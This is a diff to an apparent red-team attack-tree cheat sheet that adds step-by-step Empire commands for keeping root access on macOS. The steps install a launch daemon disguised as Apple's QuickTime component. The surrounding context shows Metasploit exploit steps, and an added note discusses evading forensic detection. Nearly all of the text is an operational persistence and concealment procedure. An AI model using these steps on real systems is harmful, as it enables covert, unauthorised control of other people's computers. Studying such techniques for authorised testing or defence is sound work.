@@ -13,10 +13,20 @@
     1.7 Set LHOST and LPORT
     1.8 > exploit
     1.9 Copy the three commands given for cleanup later
-1 Maintain access on macOS using empire
+2 Maintain access on macOS using empire 
+    2.1 Empire agent with high integrity (root) running on macOS (see privilige escalation on macOS tree) (AND)
+    2.2 > interact with agent
+    2.3 > usemodule persistence/osx/Launchdaemonexecutable
+    2.4 > info (to see all options)
+    2.5 > set DaemonLocation [absolute path] (for example /Library/Application Support/QuickTimeDaemon)
+    2.6 > set DaemonName [value] (com.apple.QuickTime in our case)
+    2.7 > set Listener [value] (http in our case)
+    2.8 > execute
 ```
 
 ## Notes
+
+* The empire method reports it is not opsec safe. A forensics artist may be able to tell we were there.
 
 ## Cheatsheets
 
